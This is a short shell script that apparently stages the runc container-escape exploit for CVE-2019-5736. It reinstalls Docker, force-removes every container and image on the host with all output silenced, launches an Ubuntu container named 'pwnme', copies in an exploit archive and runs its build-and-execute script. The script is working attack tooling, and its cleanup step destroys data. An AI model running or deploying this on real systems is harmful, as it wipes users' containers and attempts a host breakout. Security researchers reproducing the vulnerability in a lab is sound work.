echo "[+] Installing docker"
dnf remove docker -y &> /dev/null
dnf install docker -y &> /dev/null
echo "[+] Starting docker"
systemctl start docker &> /dev/null
docker kill $(docker ps -q) &> /dev/null
docker rm --force $(docker ps -a -q) &> /dev/null
docker rmi --force $(docker images -q) &> /dev/null
echo "[+] Downloading container"
docker run --rm --name pwnme -dit ubuntu:18.10 bash &> /dev/null
docker cp CVE-2019-5736.tar pwnme:/CVE-2019-5736.tar &> /dev/null
docker exec -it pwnme apt-get update &> /dev/null
docker exec -it pwnme apt-get install -y gcc runc &> /dev/null
echo "[+] Uploading exploit"
docker exec -it pwnme tar xf CVE-2019-5736.tar &> /dev/null
echo "[+] Executing docker"
docker exec -it pwnme ./CVE-2019-5736/make.sh &> /dev/null
